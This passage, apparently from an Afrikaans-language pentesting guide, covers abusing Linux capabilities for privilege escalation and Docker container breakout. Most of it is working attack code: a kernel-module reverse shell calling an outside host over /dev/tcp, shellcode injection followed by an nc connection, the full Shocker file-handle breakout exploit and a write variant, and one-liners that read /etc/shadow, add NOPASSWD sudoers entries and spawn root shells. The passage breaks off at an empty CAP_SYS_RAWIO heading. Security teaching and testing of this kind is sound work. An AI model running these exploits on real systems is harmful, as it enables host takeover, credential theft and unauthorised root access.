Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```

Lys **prosesse** wat in die **gasheer** loop: `ps -eaf`

1. Kry die **argitektuur**: `uname -m`
2. Vind **shellcode** vir die argitektuur ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Vind ’n **program** om die **shellcode** in ’n proses se geheue te **inject** ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Wysig** die **shellcode** in die program en **compile** dit: `gcc inject.c -o inject`
5. **Inject** dit en kry jou **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** stel ’n proses in staat om kernel modules te **laai en te verwyder (`init_module(2)`, `finit_module(2)` en `delete_module(2)` system calls)**, wat direkte toegang tot die kernel se kernbedrywighede bied. Hierdie capability hou kritieke sekuriteitsrisiko’s in, omdat die laai van ’n module die kernel se gedrag kan verander en isolasiegrense kan omseil.<sup>[[6]](#references)[[14]](#references)</sup>
In ’n gewone rootful Linux-container teiken dit die **gedeelde host-kernel** en is dit dus ’n direkte breakout. Die capability moet effektief wees in die aanvanklike user namespace, omdat die laai van modules nie genomespas word nie. ’n Userspace-kernel- of VM-geïsoleerde runtime soos gVisor, Kata of Hyper-V verander watter kernelgrens bereikbaar is. Die laai van modules kan steeds geblokkeer word deur `modules_disabled`, kernel lockdown, handtekeningafdwinging, seccomp of ’n LSM.<sup>[[14]](#references)</sup>

**Voorbeeld met ’n binêre lêer**

In die volgende voorbeeld het die **`python`**-binêre lêer hierdie capability.

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```

By verstek kontroleer die **`modprobe`**-opdrag vir afhanklikheidslys- en kaartlêers in die gids **`/lib/modules/$(uname -r)`**.\
Om dit te misbruik, laat ons ’n vals **lib/modules**-lêergids skep:

```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```

Stel dan **die kernmodule saam wat jy in die 2 voorbeelde hieronder kan vind en kopieer** dit na hierdie vouer:

```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```

Laastens, voer die nodige Python-kode uit om hierdie kernel module te laai:

```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```

**Voorbeeld 2 met binary**

In die volgende voorbeeld het die binary **`kmod`** hierdie capability.

```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```

Dit beteken dat dit moontlik is om die opdrag **`insmod`** te gebruik om ’n kernel module in te voeg. Volg die voorbeeld hieronder om ’n **reverse shell** te kry deur hierdie privilege te misbruik.

**Voorbeeld met ’n environment (Docker breakout)**

Jy kan die geaktiveerde capabilities binne die Docker-container nagaan met:

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

In die vorige uitvoer kan jy sien dat die **SYS_MODULE**-vermoë geaktiveer is.<sup>[[14]](#references)</sup>

**Skep** die **kernel module** wat ’n reverse shell gaan uitvoer, en die **Makefile** om dit te **compile**:

```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

> [!WARNING]
> Die leë karakter voor elke make-woord in die Makefile **moet ’n tab wees, nie spasies nie**!

Voer `make` uit om dit te kompileer.

```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```

Uiteindelik, begin `nc` binne ’n shell en **laai die module** vanaf ’n ander een, en jy sal die shell in die nc-proses vaslê:

```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```

**Die kode vir hierdie tegniek is gekopieer uit die laboratorium vir "Abusing SYS_MODULE Capability" by** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

Nog ’n voorbeeld van hierdie tegniek kan gevind word by [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) stel ’n proses in staat om **toestemmingskontroles vir die lees van lêers en vir die lees en uitvoer van gidse te omseil**. Dit magtig ook `open_by_handle_at(2)`, wat ’n geldige lêerhandvatsel interpreteer relatief tot ’n mount-lêerbeskrywer vir dieselfde gemounte lêerstelsel. Dit stel nie outomaties elke lêer buite die proses se mount namespace bloot nie. ’n File-handle breakout vereis ook ’n lêerstelselverwysing wat vir die host relevant is, geldige of ontdekbare handvatsels, ’n versoenbare lêerstelsel- en sto oruitleg, en geen runtime- of LSM-blokkering nie. Die historiese Docker-"Shocker"-tegniek het so ’n kombinasie in geraakte uitlegte gedemonstreer, soos [hier](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) ontleed.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
**Dit beteken dat jy lêerleestoestemmingskontroles en gidslees-/uitvoertoestemmingskontroles kan omseil**.<sup>[[14]](#references)</sup>

Vir ’n **custom executable** met hierdie capability, ondersoek wat dit lees en aan die oproeper teruggee. ’n Lêerskandeerder wat ’n pad na ’n beskermde lêer en ’n voorvoegsellengte aanvaar wat deur die oproeper gekies is, en dan ’n volledige digest van daardie voorvoegsel openbaar, kan as ’n file-read oracle dien: nadat die eerste `n-1` grepe herwin is, vergelyk die kandidaat-digests vir elke moontlike volgende greep met die digest wat die helper vir lengte `n` gee. Dit berus nie daarop dat ’n kriptografiese botsing gevind word of spesifiek MD5 gebruik word nie; dit berus op herhaalde navrae met gekose lengtes en sigbare, deterministiese digests. ’n Digest van die hele lêer sonder beheer oor die voorvoegsel bevestig nie dieselfde metode nie. Bevestig dat die oproeper die helper kan uitvoer, sy file capability effektief word, die gekose pad in sy mount namespace bereikbaar is en die invoer-/uitsetgedrag werklik bestaan. Moenie ’n onbekende helper met verhoogde voorregte uitvoer net om dit tydens passiewe enumerasie te toets nie.

**Voorbeeld met ’n binary**

Die binary kan lêers lees wat in sy namespaces toeganklik is. As ’n lêer soos `tar` dus hierdie capability het, kan dit die shadow-lêer lees:

```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```

**Voorbeeld met binary2**

In hierdie geval, kom ons neem aan dat die **`python`** binary hierdie capability het. Om root-lêers te lys, kan jy die volgende doen:

```python
import os
for r, d, f in os.walk('/root'):
    for filename in f:
        print(filename)
```

En om ’n lêer te lees, kan jy die volgende doen:

```python
print(open("/etc/shadow", "r").read())
```

**Voorbeeld in omgewing (Docker breakout)**

Jy kan die geaktiveerde capabilities binne die Docker-houer nagaan met `capsh --print`.<sup>[[14]](#references)[[26]](#references)</sup>

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

Binne die vorige uitvoer kan jy sien dat die **DAC_READ_SEARCH**-capability geaktiveer is. Dit omseil DAC-lees-/soektoetse en laat `open_by_handle_at(2)` toe; dit is nie op sigself ’n process-ontfoutingscapability nie.<sup>[[14]](#references)</sup>

Jy kan lees hoe die volgende exploit werk by [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), maar kortliks: **CAP_DAC_READ_SEARCH** laat toe dat die lêerstelsel sonder toestemmingstoetse deurkruis word en laat `open_by_handle_at(2)` toe; dit kan lêers blootstel wat deur ander prosesse oopgemaak is wanneer die relevante namespaces en mounts bereikbaar is.<sup>[[13]](#references)[[14]](#references)</sup>

Die oorspronklike exploit wat hierdie toestemmings misbruik om lêers vanaf die host te lees, is hier te kry: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c); die volgende is ’n **gewysigde weergawe waarmee jy die lêer wat gelees moet word as die eerste argument kan deurgee en die resultaat na ’n lêer kan uitstort**.<sup>[[12]](#references)</sup>

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
    unsigned int handle_bytes;
    int handle_type;
    unsigned char f_handle[8];
};

void die(const char *msg)
{
    perror(msg);
    exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
    fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
    h->handle_type);
    for (int i = 0; i < h->handle_bytes; ++i) {
        fprintf(stderr,"0x%02x", h->f_handle[i]);
        if ((i + 1) % 20 == 0)
        fprintf(stderr,"\n");
        if (i < h->handle_bytes - 1)
        fprintf(stderr,", ");
    }
    fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
    int fd;
    uint32_t ino = 0;
    struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
    };
    DIR *dir = NULL;
    struct dirent *de = NULL;
    path = strchr(path, '/');
    // recursion stops if path has been resolved
    if (!path) {
        memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
        oh->handle_type = 1;
        oh->handle_bytes = 8;
        return 1;
    }

    ++path;
    fprintf(stderr, "[*] Resolving '%s'\n", path);
    if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
        die("[-] open_by_handle_at");
    if ((dir = fdopendir(fd)) == NULL)
        die("[-] fdopendir");
    for (;;) {
        de = readdir(dir);
        if (!de)
        break;
        fprintf(stderr, "[*] Found %s\n", de->d_name);
        if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
            fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
            ino = de->d_ino;
            break;
        }
    }

    fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
    if (de) {
        for (uint32_t i = 0; i < 0xffffffff; ++i) {
            outh.handle_bytes = 8;
            outh.handle_type = 1;
            memcpy(outh.f_handle, &ino, sizeof(ino));
            memcpy(outh.f_handle + 4, &i, sizeof(i));
            if ((i % (1<<20)) == 0)
                fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
            if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
                closedir(dir);
                close(fd);
                dump_handle(&outh);
                return find_handle(bfd, path, &outh, oh);
            }
        }
    }
    closedir(dir);
    close(fd);
    return 0;
}


int main(int argc,char* argv[] )
{
    char buf[0x1000];
    int fd1, fd2;
    struct my_file_handle h;
    struct my_file_handle root_h = {
        .handle_bytes = 8,
        .handle_type = 1,
        .f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
    };

    fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

    read(0, buf, 1);

    // get a FS reference from something mounted in from outside
    if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
        die("[-] open");

    if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
        die("[-] Cannot find valid handle!");

    fprintf(stderr, "[!] Got a final handle!\n");
    dump_handle(&h);

    if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
        die("[-] open_by_handle");

    memset(buf, 0, sizeof(buf));
    if (read(fd2, buf, sizeof(buf) - 1) < 0)
        die("[-] read");

    printf("Success!!\n");

    FILE *fptr;
    fptr = fopen(argv[2], "w");
    fprintf(fptr,"%s", buf);
    fclose(fptr);

    close(fd2); close(fd1);

    return 0;
}
```

> [!WARNING]
> Die exploit moet ’n pointer vind na iets wat op die gasheer gemonteer is. Die oorspronklike exploit het die lêer /.dockerinit gebruik, en hierdie gewysigde weergawe gebruik /etc/hostname. As die exploit nie werk nie, moet jy dalk ’n ander lêer stel. Om ’n lêer te vind wat op die gasheer gemonteer is, voer bloot die mount-opdrag uit:

![CAP SYS MODULE - CAP DAC READ SEARCH: Die exploit moet ’n pointer vind na iets wat op die gasheer gemonteer is. Die oorspronklike exploit het die lêer /.dockerinit gebruik, en hierdie gewysigde weergawe gebruik...](<../../images/image (407) (1).png>)

**Die kode vir hierdie tegniek is oorgeneem uit die laboratorium “Abusing DAC_READ_SEARCH Capability” van** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**Hierdie capability omseil lêerlees- en -skryftoestemmingkontroles en die meeste uitvoeringskontroles**; om ’n gewone lêer uit te voer, moet minstens een uitvoeringsbis steeds gestel wees. Dit ignoreer nie ’n leesalleen-mount, ’n onveranderlike toestand of ’n LSM-weiering nie.<sup>[[14]](#references)</sup>

Soek na lêers wat leesbaar of skryfbaar word deur lidmaatskap van ’n bevoorregte groep; die bruikbare teikens hang af van die teiken se eienaarskap en modusbisies.<sup>[[14]](#references)</sup>

**Voorbeeld met binary**

In hierdie voorbeeld het vim hierdie capability, sodat jy enige lêer soos _passwd_, _sudoers_ of _shadow_ kan wysig:

```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```

**Voorbeeld met binêre lêer 2**

In hierdie voorbeeld sal die **`python`**-binêre lêer hierdie capability hê. Jy kan python gebruik om enige lêer te oorskryf:

```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```

**Voorbeeld met omgewing + CAP_DAC_READ_SEARCH (Docker-breakout)**

`CAP_DAC_READ_SEARCH` laat `open_by_handle_at(2)` toe, maar omseil **nie** skryftoestemmingkontroles nie. Om deur ’n opgeloste handle te skryf, vereis ook skryftoegang vir die proses se effektiewe lêerstelsel-UID/GID of ACL, of `CAP_DAC_OVERRIDE`. Die lêerstelselverwysing wat vir die gasheer relevant is, ondersteunde lêerhandles, ’n skryfbare mount en die runtime-/LSM-beleid moet ook die bewerking toelaat. Gaan die effektiewe capabilities en identiteit na; nie een capability alleen bewys dat ’n skryfbare teiken op die gasheer bestaan nie. Sien [capabilities(7)](https://man7.org/linux/man-pages/man7/capabilities.7.html) en [open_by_handle_at(2)](https://man7.org/linux/man-pages/man2/open_by_handle_at.2.html).<sup>[[14]](#references)[[26]](#references)</sup>

Lees eerstens die vorige afdeling wat [**die DAC_READ_SEARCH capability misbruik om arbitrêre lêers te lees**](linux-capabilities.md#cap_dac_read_search) van die gasheer en **stel** die exploit saam.\
Die volgende historiese voorbeeld probeer om ’n opgeloste lêer met `O_RDWR` oop te maak; dit slaag slegs wanneer die voorafgaande voorwaardes vir die lêerstelsel en skryftoestemming nagekom word:

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
  unsigned int handle_bytes;
  int handle_type;
  unsigned char f_handle[8];
};
void die(const char * msg) {
  perror(msg);
  exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
  fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
    h -> handle_type);
  for (int i = 0; i < h -> handle_bytes; ++i) {
    fprintf(stderr, "0x%02x", h -> f_handle[i]);
    if ((i + 1) % 20 == 0)
      fprintf(stderr, "\n");
    if (i < h -> handle_bytes - 1)
      fprintf(stderr, ", ");
  }
  fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
  int fd;
  uint32_t ino = 0;
  struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
  };
  DIR * dir = NULL;
  struct dirent * de = NULL;
  path = strchr(path, '/');
  // recursion stops if path has been resolved
  if (!path) {
    memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
    oh -> handle_type = 1;
    oh -> handle_bytes = 8;
    return 1;
  }
  ++path;
  fprintf(stderr, "[*] Resolving '%s'\n", path);
  if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
    die("[-] open_by_handle_at");
  if ((dir = fdopendir(fd)) == NULL)
    die("[-] fdopendir");
  for (;;) {
    de = readdir(dir);
    if (!de)
      break;
    fprintf(stderr, "[*] Found %s\n", de -> d_name);
    if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
      fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
      ino = de -> d_ino;
      break;
    }
  }
  fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
  if (de) {
    for (uint32_t i = 0; i < 0xffffffff; ++i) {
      outh.handle_bytes = 8;
      outh.handle_type = 1;
      memcpy(outh.f_handle, & ino, sizeof(ino));
      memcpy(outh.f_handle + 4, & i, sizeof(i));
      if ((i % (1 << 20)) == 0)
        fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
      if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
        closedir(dir);
        close(fd);
        dump_handle( & outh);
        return find_handle(bfd, path, & outh, oh);
      }
    }
  }
  closedir(dir);
  close(fd);
  return 0;
}
int main(int argc, char * argv[]) {
  char buf[0x1000];
  int fd1, fd2;
  struct my_file_handle h;
  struct my_file_handle root_h = {
    .handle_bytes = 8,
    .handle_type = 1,
    .f_handle = {
      0x02,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    }
  };
  fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
  read(0, buf, 1);
  // get a FS reference from something mounted in from outside
  if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
    die("[-] open");
  if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
    die("[-] Cannot find valid handle!");
  fprintf(stderr, "[!] Got a final handle!\n");
  dump_handle( & h);
  if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
    die("[-] open_by_handle");
  char * line = NULL;
  size_t len = 0;
  FILE * fptr;
  ssize_t read;
  fptr = fopen(argv[2], "r");
  while ((read = getline( & line, & len, fptr)) != -1) {
    write(fd2, line, read);
  }
  printf("Success!!\n");
  close(fd2);
  close(fd1);
  return 0;
}
```

Om uit die Docker-container te ontsnap, kan jy die lêers `/etc/shadow` en `/etc/passwd` van die gasheer **aflaai**, ’n **nuwe gebruiker** daarby **voeg** en **`shocker_write`** gebruik om dit te oorskryf. Kry dan **toegang** via **ssh**.

**Die kode vir hierdie tegniek is gekopieer uit die laboratorium “Abusing DAC_OVERRIDE Capability” van** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

## CAP_CHOWN

**Hierdie capability laat ’n proses toe om die eienaarskap van lêers te verander**.<sup>[[14]](#references)</sup>

**Voorbeeld met ’n binary**

Kom ons neem aan die **`python`**-binary het hierdie capability; jy kan die eienaar van ’n lêer soos **`shadow`** verander en dan die gevolglike toegang gebruik om dit te wysig, indien ander toestemmings dit toelaat:

```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```

Of met die **`ruby`**-binêre lêer wat hierdie vermoë het:

```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```

## CAP_FOWNER

**Hierdie capability omseil eienaarskapkontroles vir baie lêerbewerkings, insluitend die verandering van permissions**.<sup>[[14]](#references)</sup>

**Voorbeeld met binary**

As Python hierdie capability het, kan jy die permissions van die shadow-lêer verander, **die root-wagwoord verander** en voorregte eskaleer:

```bash
python -c 'import os; os.chmod("/etc/shadow", 0o666)'
```

### CAP_SETUID

**Hierdie vermoë laat ’n proses toe om sy effektiewe gebruikers-ID te verander, onderhewig aan die geloofsbriewe- en vermoëreëls wat deur die kernel afgedwing word**.<sup>[[14]](#references)</sup>

**Voorbeeld met ’n binary**

As python hierdie **vermoë** het, kan jy dit baie maklik misbruik om voorregte tot root te verhoog:

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

**Nog 'n manier:**

```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```

Vir ’n **pasgemaakte** uitvoerbare lêer met effektiewe `CAP_SETUID`, ondersoek die bereikbare kodepad eerder as om aan te neem dat die capability alleen ’n shell gee. Teks wat deur die aanroeper beheer word en as die *format string* aan [`printf`](https://man7.org/linux/man-pages/man3/printf.3.html) deurgegee word, kan prosesgeheue blootstel of verander; ’n bruikbare voorregoorgang hang steeds af van ’n kwesbare funksieaanroep, beheerbare invoer en ’n latere aksie ná `setuid(0)`. As daardie aksie ’n eksterne helper volgens naam begin, verifieer die effektiewe identiteit wanneer dit begin word, die werklike `PATH`, en of ’n vroeër deursoekte gids deur die aanroeper geskryf en deurkruis kan word. ’n Oneffektiewe lêercapability, `no_new_privs`, ’n vaste vertroude helperpad of ’n onbereikbare tak verander die resultaat. Gaan die binêre lêer of beskikbare bronkode vanlyn na; moenie tydens roetine-enumerasie ’n verdagte helper met verhoogde voorregte uitvoer nie.

## CAP_SETGID

**Hierdie capability laat ’n proses toe om sy effektiewe groep-ID te verander, onderhewig aan die geloofsbriewe- en capability-reëls wat deur die kernel afgedwing word**.<sup>[[14]](#references)</sup>

Daar is baie lêers wat jy kan **oorheers om voorregte te verhoog;** [**jy kan hier idees kry**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Voorbeeld met binêre lêer**

In hierdie geval moet jy soek na interessante lêers wat ’n groep kan lees, omdat jy enige groep kan naboots:

```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```

Sodra jy ’n lêer gevind het wat jy kan misbruik (deur dit te lees of te skryf) om voorregte te eskaleer, kan jy **’n shell kry wat die interessante groep naboots** met:

```python
import os
os.setgid(42)
os.system("/bin/bash")
```

In hierdie geval is daar as die groep shadow voorgedoen, sodat jy die lêer `/etc/shadow` kan lees:

```bash
cat /etc/shadow
```

### Gekombineerde ketting: CAP_SETGID + CAP_CHOWN

Wanneer albei capabilities in dieselfde helper beskikbaar is, is ’n praktiese ketting:

1. Skakel EGID oor na `shadow` (of ’n ander bevoorregte groep).
2. Gebruik `chown` op `/etc/shadow` om jou UID in te stel terwyl jy die groep `shadow` behou.
3. Lees ’n teiken-hash en crack/pivot.

```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```

Dit vermy dat jy direk volle root-toegang nodig het en is dikwels genoeg om deur hergebruik van geloofsbriewe na ander toegang oor te skakel.

As **docker** geïnstalleer is, kan jy jou as die **docker-groep** voordoen en dit misbruik om via die [**docker-socket** voorregte te verhoog](#writable-docker-socket).

## CAP_SETFCAP

**Hierdie vermoë laat ’n proses toe om lêervermoëns in te stel**.<sup>[[14]](#references)</sup>

**Voorbeeld met ’n binêre lêer**

As python hierdie **vermoë** het, kan jy dit baie maklik misbruik om voorregte tot root te verhoog:

```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
    print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```

> [!WARNING]
> ’n Nuutgeskrewe lêervermoëstel vervang die vorige stel; as die helper dan met slegs die nuwe vermoëns uitgevoer word, behou dit moontlik nie meer `CAP_SETFCAP` om ’n ander lêer by te werk nie.<sup>[[14]](#references)[[25]](#references)</sup>

Sodra jy [SETUID capability](linux-capabilities.md#cap_setuid) het, kan jy na die afdeling daarvan gaan om te sien hoe om voorregte te eskaleer.

**Voorbeeld met omgewing (Docker breakout)**

Docker se gedokumenteerde verstekvermoëstel sluit **CAP_SETFCAP** in, maar die werklike stel hang van die runtime-konfigurasie af.<sup>[[19]](#references)</sup>
Jy kan die proses se vermoëns met die volgende nagaan:

```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

Hierdie vermoë laat toe dat lêervermoëns geskryf word, maar verleen nie op sigself daardie vermoëns aan die huidige proses nie en omseil ook nie die reëls vir lêers, die begrensingstel en naamruimtes wat toegepas word wanneer die lêer uitgevoer word nie.<sup>[[14]](#references)</sup>

```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```

Die lêer se toegelate capabilities word beperk deur die proses se capability bounding set, en die lêer se effective-bit bepaal of die lêer se toegelate stel by die proses se effective set gevoeg word. Daarom maak die byvoeging van capabilities by ’n lêer nie outomaties elke aangevraagde capability tydens uitvoering bruikbaar nie.<sup>[[14]](#references)</sup>

## CAP_SYS_RAWIO

